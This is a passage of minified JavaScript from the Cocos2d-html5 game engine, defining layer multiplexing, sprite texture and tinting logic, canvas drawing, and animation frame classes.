		a >= this._layers.length ? cc.log(cc._LogInfos.LayerMultiplex_switchToAndReleaseMe) : (this.removeChild(this._layers[this._enabledLayer], !0), this._layers[this._enabledLayer] = null, this._enabledLayer = a, this.addChild(this._layers[a]))
	},
	addLayer: function(a) {
		a ? this._layers.push(a) : cc.log(cc._LogInfos.LayerMultiplex_addLayer)
	}
});
cc.LayerMultiplex.create = function() {
	return new cc.LayerMultiplex(arguments)
};
cc._tmp.PrototypeSprite = function() {
	var a = cc.Sprite.prototype;
	cc.defineGetterSetter(a, "opacityModifyRGB", a.isOpacityModifyRGB, a.setOpacityModifyRGB);
	cc.defineGetterSetter(a, "opacity", a.getOpacity, a.setOpacity);
	cc.defineGetterSetter(a, "color", a.getColor, a.setColor);
	cc.defineGetterSetter(a, "flippedX", a.isFlippedX, a.setFlippedX);
	cc.defineGetterSetter(a, "flippedY", a.isFlippedY, a.setFlippedY);
	cc.defineGetterSetter(a, "offsetX", a._getOffsetX);
	cc.defineGetterSetter(a, "offsetY", a._getOffsetY);
	cc.defineGetterSetter(a, "texture", a.getTexture, a.setTexture);
	cc.defineGetterSetter(a, "textureRectRotated", a.isTextureRectRotated);
	cc.defineGetterSetter(a, "batchNode", a.getBatchNode, a.setBatchNode);
	cc.defineGetterSetter(a, "quad", a.getQuad)
};
cc.generateTextureCacheForColor = function(a) {
	function b() {
		var b = cc.generateTextureCacheForColor,
			d = a.width,
			g = a.height;
		c[0].width = d;
		c[0].height = g;
		c[1].width = d;
		c[1].height = g;
		c[2].width = d;
		c[2].height = g;
		c[3].width = d;
		c[3].height = g;
		b.canvas.width = d;
		b.canvas.height = g;
		var h = b.canvas.getContext("2d");
		h.drawImage(a, 0, 0);
		b.tempCanvas.width = d;
		b.tempCanvas.height = g;
		for (var h = h.getImageData(0, 0, d, g).data, k = 0; 4 > k; k++) {
			var l = c[k].getContext("2d");
			l.getImageData(0, 0, d, g).data;
			b.tempCtx.drawImage(a, 0, 0);
			for (var m = b.tempCtx.getImageData(0, 0, d, g), n = m.data, q = 0; q < h.length; q += 4) n[q] = 0 === k ? h[q] : 0, n[q + 1] = 1 === k ? h[q + 1] : 0, n[q + 2] = 2 === k ? h[q + 2] : 0, n[q + 3] = h[q + 3];
			l.putImageData(m, 0, 0)
		}
		a.onload = null
	}
	if (a.channelCache) return a.channelCache;
	var c = [cc.newElement("canvas"), cc.newElement("canvas"), cc.newElement("canvas"), cc.newElement("canvas")];
	try {
		b()
	} catch (d) {
		a.onload = b
	}
	return a.channelCache = c
};
cc.generateTextureCacheForColor.canvas = cc.newElement("canvas");
cc.generateTextureCacheForColor.tempCanvas = cc.newElement("canvas");
cc.generateTextureCacheForColor.tempCtx = cc.generateTextureCacheForColor.tempCanvas.getContext("2d");
cc.generateTintImage2 = function(a, b, c) {
	c || (c = cc.rect(0, 0, a.width, a.height), c = cc.rectPixelsToPoints(c));
	var d = cc.newElement("canvas"),
		e = d.getContext("2d");
	d.width != c.width && (d.width = c.width);
	d.height != c.height && (d.height = c.height);
	e.save();
	e.drawImage(a, c.x, c.y, c.width, c.height, 0, 0, c.width, c.height);
	e.globalCompositeOperation = "source-in";
	e.globalAlpha = b.a / 255;
	e.fillStyle = "rgb(" + b.r + "," + b.g + "," + b.b + ")";
	e.fillRect(0, 0, c.width, c.height);
	e.restore();
	return d
};
cc.generateTintImage = function(a, b, c, d, e) {
	d || (d = cc.rect(0, 0, a.width, a.height));
	a = c.r / 255;
	var f = c.g / 255;
	c = c.b / 255;
	var g = Math.min(d.width, b[0].width),
		h = Math.min(d.height, b[0].height),
		k;
	e ? (k = e.getContext("2d"), k.clearRect(0, 0, g, h)) : (e = cc.newElement("canvas"), e.width = g, e.height = h, k = e.getContext("2d"));
	k.save();
	k.globalCompositeOperation = "lighter";
	var l = k.globalAlpha;
	0 < a && (k.globalAlpha = a * l, k.drawImage(b[0], d.x, d.y, g, h, 0, 0, g, h));
	0 < f && (k.globalAlpha = f * l, k.drawImage(b[1], d.x, d.y, g, h, 0, 0, g, h));
	0 < c && (k.globalAlpha = c * l, k.drawImage(b[2], d.x, d.y, g, h, 0, 0, g, h));
	1 > a + f + c && (k.globalAlpha = l, k.drawImage(b[3], d.x, d.y, g, h, 0, 0, g, h));
	k.restore();
	return e
};
cc.cutRotateImageToCanvas = function(a, b) {
	if (!a) return null;
	if (!b) return a;
	var c = cc.newElement("canvas");
	c.width = b.width;
	c.height = b.height;
	var d = c.getContext("2d");
	d.translate(c.width / 2, c.height / 2);
	d.rotate(-1.5707963267948966);
	d.drawImage(a, b.x, b.y, b.height, b.width, -b.height / 2, -b.width / 2, b.height, b.width);
	return c
};
cc.Sprite = cc.NodeRGBA.extend({
	RGBAProtocol: !0,
	dirty: !1,
	atlasIndex: 0,
	textureAtlas: null,
	_batchNode: null,
	_recursiveDirty: null,
	_hasChildren: null,
	_shouldBeHidden: !1,
	_transformToBatch: null,
	_blendFunc: null,
	_texture: null,
	_rect: null,
	_rectRotated: !1,
	_offsetPosition: null,
	_unflippedOffsetPositionFromCenter: null,
	_opacityModifyRGB: !1,
	_flippedX: !1,
	_flippedY: !1,
	_textureLoaded: !1,
	_loadedEventListeners: null,
	_newTextureWhenChangeColor: null,
	_className: "Sprite",
	textureLoaded: function() {
		return this._textureLoaded
	},
	addLoadedEventListener: function(a, b) {
		this._loadedEventListeners || (this._loadedEventListeners = []);
		this._loadedEventListeners.push({
			eventCallback: a,
			eventTarget: b
		})
	},
	_callLoadedEventCallbacks: function() {
		if (this._loadedEventListeners) {
			for (var a = this._loadedEventListeners, b = 0, c = a.length; b < c; b++) {
				var d = a[b];
				d.eventCallback.call(d.eventTarget, this)
			}
			a.length = 0
		}
	},
	isDirty: function() {
		return this.dirty
	},
	setDirty: function(a) {
		this.dirty = a
	},
	isTextureRectRotated: function() {
		return this._rectRotated
	},
	getAtlasIndex: function() {
		return this.atlasIndex
	},
	setAtlasIndex: function(a) {
		this.atlasIndex = a
	},
	getTextureRect: function() {
		return cc.rect(this._rect.x, this._rect.y, this._rect.width, this._rect.height)
	},
	getTextureAtlas: function() {
		return this.textureAtlas
	},
	setTextureAtlas: function(a) {
		this.textureAtlas = a
	},
	getOffsetPosition: function() {
		return this._offsetPosition
	},
	_getOffsetX: function() {
		return this._offsetPosition.x
	},
	_getOffsetY: function() {
		return this._offsetPosition.y
	},
	getBlendFunc: function() {
		return this._blendFunc
	},
	initWithSpriteFrame: function(a) {
		cc.assert(a, cc._LogInfos.Sprite_initWithSpriteFrame);
		a.textureLoaded() || (this._textureLoaded = !1, a.addLoadedEventListener(this._spriteFrameLoadedCallback, this));
		var b = cc._renderType === cc._RENDER_TYPE_CANVAS ? !1 : a._rotated,
			b = this.initWithTexture(a.getTexture(), a.getRect(), b);
		this.setSpriteFrame(a);
		return b
	},
	_spriteFrameLoadedCallback: null,
	initWithSpriteFrameName: function(a) {
		cc.assert(a, cc._LogInfos.Sprite_initWithSpriteFrameName);
		var b = cc.spriteFrameCache.getSpriteFrame(a);
		cc.assert(b, a + cc._LogInfos.Sprite_initWithSpriteFrameName1);
		return this.initWithSpriteFrame(b)
	},
	useBatchNode: function(a) {
		this.textureAtlas = a.textureAtlas;
		this._batchNode = a
	},
	setVertexRect: function(a) {
		this._rect.x = a.x;
		this._rect.y = a.y;
		this._rect.width = a.width;
		this._rect.height = a.height
	},
	sortAllChildren: function() {
		if (this._reorderChildDirty) {
			var a = this._children,
				b = a.length,
				c, d, e;
			for (c = 1; c < b; c++) {
				e = a[c];
				for (d = c - 1; 0 <= d;) {
					if (e._localZOrder < a[d]._localZOrder) a[d + 1] = a[d];
					else if (e._localZOrder === a[d]._localZOrder && e.arrivalOrder < a[d].arrivalOrder) a[d + 1] = a[d];
					else break;
					d--
				}
				a[d + 1] = e
			}
			this._batchNode && this._arrayMakeObjectsPerformSelector(a, cc.Node.StateCallbackType.sortAllChildren);
			this._reorderChildDirty = !1
		}
	},
	reorderChild: function(a, b) {
		cc.assert(a, cc._LogInfos.Sprite_reorderChild_2); - 1 === this._children.indexOf(a) ? cc.log(cc._LogInfos.Sprite_reorderChild) : b !== a.zIndex && (this._batchNode && !this._reorderChildDirty && (this._setReorderChildDirtyRecursively(), this._batchNode.reorderBatch(!0)), cc.Node.prototype.reorderChild.call(this, a, b))
	},
	removeChild: function(a, b) {
		this._batchNode && this._batchNode.removeSpriteFromAtlas(a);
		cc.Node.prototype.removeChild.call(this, a, b)
	},
	removeAllChildren: function(a) {
		var b = this._children,
			c = this._batchNode;
		if (c && null != b) for (var d = 0, e = b.length; d < e; d++) c.removeSpriteFromAtlas(b[d]);
		cc.Node.prototype.removeAllChildren.call(this, a);
		this._hasChildren = !1
	},
	setDirtyRecursively: function(a) {
		this.dirty = this._recursiveDirty = a;
		a = this._children;
		for (var b, c = a ? a.length : 0, d = 0; d < c; d++) b = a[d], b instanceof cc.Sprite && b.setDirtyRecursively(!0)
	},
	setNodeDirty: function(a) {
		cc.Node.prototype.setNodeDirty.call(this);
		!a && (this._batchNode && !this._recursiveDirty) && (this._hasChildren ? this.setDirtyRecursively(!0) : this.dirty = this._recursiveDirty = !0)
	},
	ignoreAnchorPointForPosition: function(a) {
		this._batchNode ? cc.log(cc._LogInfos.Sprite_ignoreAnchorPointForPosition) : cc.Node.prototype.ignoreAnchorPointForPosition.call(this, a)
	},
	setFlippedX: function(a) {
		this._flippedX != a && (this._flippedX = a, this.setTextureRect(this._rect, this._rectRotated, this._contentSize), this.setNodeDirty(!0))
	},
	setFlippedY: function(a) {
		this._flippedY != a && (this._flippedY = a, this.setTextureRect(this._rect, this._rectRotated, this._contentSize), this.setNodeDirty(!0))
	},
	isFlippedX: function() {
		return this._flippedX
	},
	isFlippedY: function() {
		return this._flippedY
	},
	setOpacityModifyRGB: null,
	isOpacityModifyRGB: function() {
		return this._opacityModifyRGB
	},
	updateDisplayedOpacity: null,
	setDisplayFrameWithAnimationName: function(a, b) {
		cc.assert(a, cc._LogInfos.Sprite_setDisplayFrameWithAnimationName_3);
		var c = cc.animationCache.getAnimation(a);
		c ? (c = c.getFrames()[b]) ? this.setSpriteFrame(c.getSpriteFrame()) : cc.log(cc._LogInfos.Sprite_setDisplayFrameWithAnimationName_2) : cc.log(cc._LogInfos.Sprite_setDisplayFrameWithAnimationName)
	},
	getBatchNode: function() {
		return this._batchNode
	},
	_setReorderChildDirtyRecursively: function() {
		if (!this._reorderChildDirty) {
			this._reorderChildDirty = !0;
			for (var a = this._parent; a && a != this._batchNode;) a._setReorderChildDirtyRecursively(), a = a.parent
		}
	},
	getTexture: function() {
		return this._texture
	},
	_quad: null,
	_quadWebBuffer: null,
	_quadDirty: !1,
	_colorized: !1,
	_isLighterMode: !1,
	_originalTexture: null,
	_textureRect_Canvas: null,
	_drawSize_Canvas: null,
	ctor: null,
	_softInit: function(a, b, c) {
		if (void 0 === a) cc.Sprite.prototype.init.call(this);
		else if ("string" === typeof a)"#" === a[0] ? (a = a.substr(1, a.length - 1), a = cc.spriteFrameCache.getSpriteFrame(a), this.initWithSpriteFrame(a)) : cc.Sprite.prototype.init.call(this, a, b);
		else if ("object" === typeof a) if (a instanceof cc.Texture2D) this.initWithTexture(a, b, c);
		else if (a instanceof cc.SpriteFrame) this.initWithSpriteFrame(a);
		else if (a instanceof HTMLImageElement || a instanceof HTMLCanvasElement) b = new cc.Texture2D, b.initWithElement(a), b.handleLoadedTexture(), this.initWithTexture(b)
	},
	getQuad: function() {
		return this._quad
	},
	setBlendFunc: null,
	init: null,
	initWithFile: function(a, b) {
		cc.assert(a, cc._LogInfos.Sprite_initWithFile);
		var c = cc.textureCache.textureForKey(a);
		if (c) {
			if (!b) {
				var d = c.getContentSize();
				b = cc.rect(0, 0, d.width, d.height)
			}
			return this.initWithTexture(c, b)
		}
		c = cc.textureCache.addImage(a);
		return this.initWithTexture(c, b || cc.rect(0, 0, c._contentSize.width, c._contentSize.height))
	},
	initWithTexture: null,
	_textureLoadedCallback: null,
	setTextureRect: null,
	updateTransform: null,
	addChild: null,
	updateColor: function() {
		var a = this._displayedColor,
			b = this._displayedOpacity,
			a = {
				r: a.r,
				g: a.g,
				b: a.b,
				a: b
			};
		this._opacityModifyRGB && (a.r *= b / 255, a.g *= b / 255, a.b *= b / 255);
		b = this._quad;
		b.bl.colors = a;
		b.br.colors = a;
		b.tl.colors = a;
		b.tr.colors = a;
		this._batchNode && (this.atlasIndex != cc.Sprite.INDEX_NOT_INITIALIZED ? this.textureAtlas.updateQuad(b, this.atlasIndex) : this.dirty = !0);
		this._quadDirty = !0
	},
	setOpacity: null,
	setColor: null,
	updateDisplayedColor: null,
	setSpriteFrame: null,
	setDisplayFrame: function(a) {
		cc.log(cc._LogInfos.Sprite_setDisplayFrame);
		this.setSpriteFrame(a)
	},
	isFrameDisplayed: null,
	displayFrame: function() {
		return cc.SpriteFrame.create(this._texture, cc.rectPointsToPixels(this._rect), this._rectRotated, cc.pointPointsToPixels(this._unflippedOffsetPositionFromCenter), cc.sizePointsToPixels(this._contentSize))
	},
	setBatchNode: null,
	setTexture: null,
	_updateBlendFunc: function() {
		this._batchNode ? cc.log(cc._LogInfos.Sprite__updateBlendFunc) : !this._texture || !this._texture.hasPremultipliedAlpha() ? (this._blendFunc.src = cc.SRC_ALPHA, this._blendFunc.dst = cc.ONE_MINUS_SRC_ALPHA, this.opacityModifyRGB = !1) : (this._blendFunc.src = cc.BLEND_SRC, this._blendFunc.dst = cc.BLEND_DST, this.opacityModifyRGB = !0)
	},
	_changeTextureColor: function() {
		var a, b = this._texture,
			c = this._textureRect_Canvas;
		if (b && (c.validRect && this._originalTexture) && (a = b.getHtmlElementObj())) if (b = cc.textureCache.getTextureColors(this._originalTexture.getHtmlElementObj())) this._colorized = !0, a instanceof HTMLCanvasElement && !this._rectRotated && !this._newTextureWhenChangeColor ? cc.generateTintImage(a, b, this._displayedColor, c, a) : (a = cc.generateTintImage(a, b, this._displayedColor, c), b = new cc.Texture2D, b.initWithElement(a), b.handleLoadedTexture(), this.texture = b)
	},
	_setTextureCoords: function(a) {
		a = cc.rectPointsToPixels(a);
		var b = this._batchNode ? this.textureAtlas.texture : this._texture;
		if (b) {
			var c = b.pixelsWidth,
				d = b.pixelsHeight,
				e, f = this._quad;
			this._rectRotated ? (cc.FIX_ARTIFACTS_BY_STRECHING_TEXEL ? (b = (2 * a.x + 1) / (2 * c), c = b + (2 * a.height - 2) / (2 * c), e = (2 * a.y + 1) / (2 * d), a = e + (2 * a.width - 2) / (2 * d)) : (b = a.x / c, c = (a.x + a.height) / c, e = a.y / d, a = (a.y + a.width) / d), this._flippedX && (d = e, e = a, a = d), this._flippedY && (d = b, b = c, c = d), f.bl.texCoords.u = b, f.bl.texCoords.v = e, f.br.texCoords.u = b, f.br.texCoords.v = a, f.tl.texCoords.u = c, f.tl.texCoords.v = e, f.tr.texCoords.u = c, f.tr.texCoords.v = a) : (cc.FIX_ARTIFACTS_BY_STRECHING_TEXEL ? (b = (2 * a.x + 1) / (2 * c), c = b + (2 * a.width - 2) / (2 * c), e = (2 * a.y + 1) / (2 * d), a = e + (2 * a.height - 2) / (2 * d)) : (b = a.x / c, c = (a.x + a.width) / c, e = a.y / d, a = (a.y + a.height) / d), this._flippedX && (d = b, b = c, c = d), this._flippedY && (d = e, e = a, a = d), f.bl.texCoords.u = b, f.bl.texCoords.v = a, f.br.texCoords.u = c, f.br.texCoords.v = a, f.tl.texCoords.u = b, f.tl.texCoords.v = e, f.tr.texCoords.u = c, f.tr.texCoords.v = e);
			this._quadDirty = !0
		}
	},
	draw: null
});
cc.Sprite.create = function(a, b, c) {
	return new cc.Sprite(a, b, c)
};
cc.Sprite.INDEX_NOT_INITIALIZED = -1;
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.Sprite.prototype, _p._spriteFrameLoadedCallback = function(a) {
	this.setNodeDirty(!0);
	this.setTextureRect(a.getRect(), a.isRotated(), a.getOriginalSize());
	a = this.color;
	(255 !== a.r || 255 !== a.g || 255 !== a.b) && this._changeTextureColor();
	this._callLoadedEventCallbacks()
}, _p.setOpacityModifyRGB = function(a) {
	this._opacityModifyRGB !== a && (this._opacityModifyRGB = a, this.setNodeDirty(!0))
}, _p.updateDisplayedOpacity = function(a) {
	cc.NodeRGBA.prototype.updateDisplayedOpacity.call(this, a);
	this._setNodeDirtyForCache()
}, _p.ctor = function(a, b, c) {
	cc.NodeRGBA.prototype.ctor.call(this);
	this._shouldBeHidden = !1;
	this._offsetPosition = cc.p(0, 0);
	this._unflippedOffsetPositionFromCenter = cc.p(0, 0);
	this._blendFunc = {
		src: cc.BLEND_SRC,
		dst: cc.BLEND_DST
	};
	this._rect = cc.rect(0, 0, 0, 0);
	this._newTextureWhenChangeColor = !1;
	this._textureLoaded = !0;
	this._textureRect_Canvas = {
		x: 0,
		y: 0,
		width: 0,
		height: 0,
		validRect: !1
	};
	this._drawSize_Canvas = cc.size(0, 0);
	this._softInit(a, b, c)
}, _p.setBlendFunc = function(a, b) {
	var c = this._blendFunc;
	void 0 === b ? (c.src = a.src, c.dst = a.dst) : (c.src = a, c.dst = b);
	this._isLighterMode = c && (c.src == cc.SRC_ALPHA && c.dst == cc.ONE || c.src == cc.ONE && c.dst == cc.ONE)
}, _p.init = function() {
	if (0 < arguments.length) return this.initWithFile(arguments[0], arguments[1]);
	cc.NodeRGBA.prototype.init.call(this);
	this.dirty = this._recursiveDirty = !1;
	this._opacityModifyRGB = !0;
	this._blendFunc.src = cc.BLEND_SRC;
	this._blendFunc.dst = cc.BLEND_DST;
	this.texture = null;
	this._textureLoaded = !0;
	this._flippedX = this._flippedY = !1;
	this.anchorY = this.anchorX = 0.5;
	this._offsetPosition.x = 0;
	this._offsetPosition.y = 0;
	this._hasChildren = !1;
	this.setTextureRect(cc.rect(0, 0, 0, 0), !1, cc.size(0, 0));
	return !0
}, _p.initWithTexture = function(a, b, c) {
	cc.assert(0 != arguments.length, cc._LogInfos.CCSpriteBatchNode_initWithTexture);
	if ((c = c || !1) && a.isLoaded()) {
		var d = a.getHtmlElementObj(),
			d = cc.cutRotateImageToCanvas(d, b),
			e = new cc.Texture2D;
		e.initWithElement(d);
		e.handleLoadedTexture();
		a = e;
		this._rect = cc.rect(0, 0, b.width, b.height)
	}
	if (!cc.NodeRGBA.prototype.init.call(this)) return !1;
	this._batchNode = null;
	this.dirty = this._recursiveDirty = !1;
	this._opacityModifyRGB = !0;
	this._blendFunc.src = cc.BLEND_SRC;
	this._blendFunc.dst = cc.BLEND_DST;
	this._flippedX = this._flippedY = !1;
	this.anchorY = this.anchorX = 0.5;
	this._offsetPosition.x = 0;
	this._offsetPosition.y = 0;
	this._hasChildren = !1;
	this._textureLoaded = d = a.isLoaded();
	if (!d) return this._rectRotated = c, b && (this._rect.x = b.x, this._rect.y = b.y, this._rect.width = b.width, this._rect.height = b.height), a.addLoadedEventListener(this._textureLoadedCallback, this), !0;
	b || (b = cc.rect(0, 0, a.width, a.height));
	a && (d = b.y + b.height, b.x + b.width > a.width && cc.error(cc._LogInfos.RectWidth, a.url), d > a.height && cc.error(cc._LogInfos.RectHeight, a.url));
	this.texture = this._originalTexture = a;
	this.setTextureRect(b, c);
	this.batchNode = null;
	return !0
}, _p._textureLoadedCallback = function(a) {
	if (!this._textureLoaded) {
		this._textureLoaded = !0;
		var b = this._rect;
		b ? cc._rectEqualToZero(b) && (b.width = a.width, b.height = a.height) : b = cc.rect(0, 0, a.width, a.height);
		this.texture = this._originalTexture = a;
		this.setTextureRect(b, this._rectRotated);
		this.batchNode = this._batchNode;
		this._callLoadedEventCallbacks()
	}
}, _p.setTextureRect = function(a, b, c) {
	this._rectRotated = b || !1;
	this.setContentSize(c || a);
	this.setVertexRect(a);
	b = this._textureRect_Canvas;
	c = cc.contentScaleFactor();
	b.x = 0 | a.x * c;
	b.y = 0 | a.y * c;
	b.width = 0 | a.width * c;
	b.height = 0 | a.height * c;
	b.validRect = !(0 === b.width || 0 === b.height || 0 > b.x || 0 > b.y);
	a = this._unflippedOffsetPositionFromCenter;
	this._flippedX && (a.x = -a.x);
	this._flippedY && (a.y = -a.y);
	this._offsetPosition.x = a.x + (this._contentSize.width - this._rect.width) / 2;
	this._offsetPosition.y = a.y + (this._contentSize.height - this._rect.height) / 2;
	this._batchNode && (this.dirty = !0)
}, _p.updateTransform = function() {
	if (this.dirty) {
		var a = this._parent;
		!this._visible || a && a != this._batchNode && a._shouldBeHidden ? this._shouldBeHidden = !0 : (this._shouldBeHidden = !1, this._transformToBatch = !a || a == this._batchNode ? this.nodeToParentTransform() : cc.AffineTransformConcat(this.nodeToParentTransform(), a._transformToBatch));
		this.dirty = this._recursiveDirty = !1
	}
	this._hasChildren && this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.updateTransform)
}, _p.addChild = function(a, b, c) {
	cc.assert(a, cc._LogInfos.CCSpriteBatchNode_addChild_2);
	null == b && (b = a._localZOrder);
	null == c && (c = a.tag);
	cc.NodeRGBA.prototype.addChild.call(this, a, b, c);
	this._hasChildren = !0
}, _p.setOpacity = function(a) {
	cc.NodeRGBA.prototype.setOpacity.call(this, a);
	this._setNodeDirtyForCache()
}, _p.setColor = function(a) {
	var b = this.color;
	b.r === a.r && b.g === a.g && b.b === a.b || (cc.NodeRGBA.prototype.setColor.call(this, a), this._changeTextureColor(), this._setNodeDirtyForCache())
}, _p.updateDisplayedColor = function(a) {
	var b = this.color;
	cc.NodeRGBA.prototype.updateDisplayedColor.call(this, a);
	a = this._displayedColor;
	b.r === a.r && b.g === a.g && b.b === a.b || (this._changeTextureColor(), this._setNodeDirtyForCache())
}, _p.setSpriteFrame = function(a) {
	var b = this;
	"string" == typeof a && (a = cc.spriteFrameCache.getSpriteFrame(a), cc.assert(a, cc._LogInfos.CCSpriteBatchNode_setSpriteFrame));
	b.setNodeDirty(!0);
	var c = a.getOffset();
	b._unflippedOffsetPositionFromCenter.x = c.x;
	b._unflippedOffsetPositionFromCenter.y = c.y;
	b._rectRotated = a.isRotated();
	var c = a.getTexture(),
		d = a.textureLoaded();
	d || (b._textureLoaded = !1, a.addLoadedEventListener(function(a) {
		b._textureLoaded = !0;
		var c = a.getTexture();
		c != b._texture && (b.texture = c);
		b.setTextureRect(a.getRect(), a.isRotated(), a.getOriginalSize());
		b._callLoadedEventCallbacks()
	}, b));
	c != b._texture && (b.texture = c);
	b._rectRotated && (b._originalTexture = c);
	b.setTextureRect(a.getRect(), b._rectRotated, a.getOriginalSize());
	b._colorized = !1;
	d && (a = b.color, (255 !== a.r || 255 !== a.g || 255 !== a.b) && b._changeTextureColor())
}, _p.isFrameDisplayed = function(a) {
	return a.getTexture() != this._texture ? !1 : cc.rectEqualToRect(a.getRect(), this._rect)
}, _p.setBatchNode = function(a) {
	(this._batchNode = a) ? (this._transformToBatch = cc.AffineTransformIdentity(), this.textureAtlas = this._batchNode.textureAtlas) : (this.atlasIndex = cc.Sprite.INDEX_NOT_INITIALIZED, this.textureAtlas = null, this.dirty = this._recursiveDirty = !1)
}, _p.setTexture = function(a) {
	a && "string" === typeof a ? (a = cc.textureCache.addImage(a), this.setTexture(a), a = a.getContentSize(), this.setTextureRect(cc.rect(0, 0, a.width, a.height))) : (cc.assert(!a || a instanceof cc.Texture2D, cc._LogInfos.CCSpriteBatchNode_setTexture), this._texture != a && (a && a.getHtmlElementObj() instanceof HTMLImageElement && (this._originalTexture = a), this._texture = a))
}, _p.draw = function(a) {
	if (this._textureLoaded) {
		a = a || cc._renderContext;
		this._isLighterMode && (a.globalCompositeOperation = "lighter");
		var b = cc.view.getScaleX(),
			c = cc.view.getScaleY();
		a.globalAlpha = this._displayedOpacity / 255;
		var d = this._rect,
			e = this._contentSize,
			f = this._offsetPosition,
			g = this._drawSize_Canvas,
			h = 0 | f.x,
			k = -f.y - d.height,
			l = this._textureRect_Canvas;
		g.width = d.width * b;
		g.height = d.height * c;
		if (this._flippedX || this._flippedY) a.save(), this._flippedX && (h = -f.x - d.width, a.scale(-1, 1)), this._flippedY && (k = f.y, a.scale(1, -1));
		h *= b;
		k *= c;
		this._texture && l.validRect ? (e = this._texture.getHtmlElementObj(), this._colorized ? a.drawImage(e, 0, 0, l.width, l.height, h, k, g.width, g.height) : a.drawImage(e, l.x, l.y, l.width, l.height, h, k, g.width, g.height)) : !this._texture && l.validRect && (g = this.color, a.fillStyle = "rgba(" + g.r + "," + g.g + "," + g.b + ",1)", a.fillRect(h, k, e.width * b, e.height * c));
		1 === cc.SPRITE_DEBUG_DRAW || this._showNode ? (a.strokeStyle = "rgba(0,255,0,1)", h /= b, k = -(k / c), h = [cc.p(h, k), cc.p(h + d.width, k), cc.p(h + d.width, k - d.height), cc.p(h, k - d.height)], cc._drawingUtil.drawPoly(h, 4, !0)) : 2 === cc.SPRITE_DEBUG_DRAW && (a.strokeStyle = "rgba(0,255,0,1)", b = this._rect, k = -k, h = [cc.p(h, k), cc.p(h + b.width, k), cc.p(h + b.width, k - b.height), cc.p(h, k - b.height)], cc._drawingUtil.drawPoly(h, 4, !0));
		(this._flippedX || this._flippedY) && a.restore();
		cc.g_NumberOfDraws++
	}
}, delete _p) : (cc.assert("function" === typeof cc._tmp.WebGLSprite, cc._LogInfos.MissingFile, "SpritesWebGL.js"), cc._tmp.WebGLSprite(), delete cc._tmp.WebGLSprite);
cc.assert("function" === typeof cc._tmp.PrototypeSprite, cc._LogInfos.MissingFile, "SpritesPropertyDefine.js");
cc._tmp.PrototypeSprite();
delete cc._tmp.PrototypeSprite;
cc.AnimationFrame = cc.Class.extend({
	_spriteFrame: null,
	_delayPerUnit: 0,
	_userInfo: null,
	ctor: function(a, b, c) {
		this._spriteFrame = a || null;
		this._delayPerUnit = b || 0;
		this._userInfo = c || null
	},
	clone: function() {
		var a = new cc.AnimationFrame;
		a.initWithSpriteFrame(this._spriteFrame.clone(), this._delayPerUnit, this._userInfo);
		return a
	},
	copyWithZone: function(a) {
		return cc.clone(this)
	},
	copy: function(a) {
		a = new cc.AnimationFrame;
		a.initWithSpriteFrame(this._spriteFrame.clone(), this._delayPerUnit, this._userInfo);
		return a
	},
	initWithSpriteFrame: function(a, b, c) {
		this._spriteFrame = a;
		this._delayPerUnit = b;
		this._userInfo = c;
		return !0
	},
	getSpriteFrame: function() {
		return this._spriteFrame
	},
	setSpriteFrame: function(a) {
		this._spriteFrame = a
	},
	getDelayUnits: function() {
		return this._delayPerUnit
	},
	setDelayUnits: function(a) {
		this._delayPerUnit = a
	},
	getUserInfo: function() {
		return this._userInfo
	},
	setUserInfo: function(a) {
		this._userInfo = a
	}
});
cc.AnimationFrame.create = function(a, b, c) {
	return new cc.AnimationFrame(a, b, c)
};
cc.Animation = cc.Class.extend({
	_frames: null,
	_loops: 0,
	_restoreOriginalFrame: !1,
	_duration: 0,
	_delayPerUnit: 0,
	_totalDelayUnits: 0,
	ctor: function(a, b, c) {
		this._frames = [];
		if (void 0 === a) this.initWithSpriteFrames(null, 0);
		else {
			var d = a[0];
			d && (d instanceof cc.SpriteFrame ? this.initWithSpriteFrames(a, b, c) : d instanceof cc.AnimationFrame && this.initWithAnimationFrames(a, b, c))
		}
	},
	getFrames: function() {
		return this._frames
	},
	setFrames: function(a) {
		this._frames = a
	},
	addSpriteFrame: function(a) {
		var b = new cc.AnimationFrame;
		b.initWithSpriteFrame(a, 1, null);
		this._frames.push(b);
		this._totalDelayUnits++
	},
	addSpriteFrameWithFile: function(a) {
		a = cc.textureCache.addImage(a);
		var b = cc.rect(0, 0, 0, 0);
		b.width = a.width;
		b.height = a.height;
		a = cc.SpriteFrame.create(a, b);
		this.addSpriteFrame(a)
	},
	addSpriteFrameWithTexture: function(a, b) {
		var c = cc.SpriteFrame.create(a, b);
		this.addSpriteFrame(c)
	},
	initWithAnimationFrames: function(a, b, c) {
		cc.arrayVerifyType(a, cc.AnimationFrame);
		this._delayPerUnit = b;
		this._loops = void 0 === c ? 1 : c;
		this._totalDelayUnits = 0;
		b = this._frames;
		for (c = b.length = 0; c < a.length; c++) {
			var d = a[c];
			b.push(d);
			this._totalDelayUnits += d.getDelayUnits()
		}
		return !0
	},
	clone: function() {
		var a = new cc.Animation;
		a.initWithAnimationFrames(this._copyFrames(), this._delayPerUnit, this._loops);
		a.setRestoreOriginalFrame(this._restoreOriginalFrame);
		return a
	},
	copyWithZone: function(a) {
		a = new cc.Animation;
		a.initWithAnimationFrames(this._copyFrames(), this._delayPerUnit, this._loops);
		a.setRestoreOriginalFrame(this._restoreOriginalFrame);
		return a
	},
	_copyFrames: function() {
		for (var a = [], b = 0; b < this._frames.length; b++) a.push(this._frames[b].clone());
		return a
	},
	copy: function(a) {
		return this.copyWithZone(null)
	},
	getLoops: function() {
		return this._loops
	},
	setLoops: function(a) {
		this._loops = a
	},
	setRestoreOriginalFrame: function(a) {
		this._restoreOriginalFrame = a
	},
	getRestoreOriginalFrame: function() {
		return this._restoreOriginalFrame
	},
	getDuration: function() {
		return this._totalDelayUnits * this._delayPerUnit
	},
	getDelayPerUnit: function() {
		return this._delayPerUnit
	},
	setDelayPerUnit: function(a) {
		this._delayPerUnit = a
	},
	getTotalDelayUnits: function() {
		return this._totalDelayUnits
	},
	initWithSpriteFrames: function(a, b, c) {
		cc.arrayVerifyType(a, cc.SpriteFrame);
		this._loops = void 0 === c ? 1 : c;
		this._delayPerUnit = b || 0;
		this._totalDelayUnits = 0;
		b = this._frames;
		b.length = 0;
		if (a) {
			for (c = 0; c < a.length; c++) {
				var d = a[c],
					e = new cc.AnimationFrame;
				e.initWithSpriteFrame(d, 1, null);
				b.push(e)
			}
			this._totalDelayUnits += a.length
		}
		return !0
	},
	retain: function() {},
	release: function() {}
});
cc.Animation.create = function(a, b, c) {
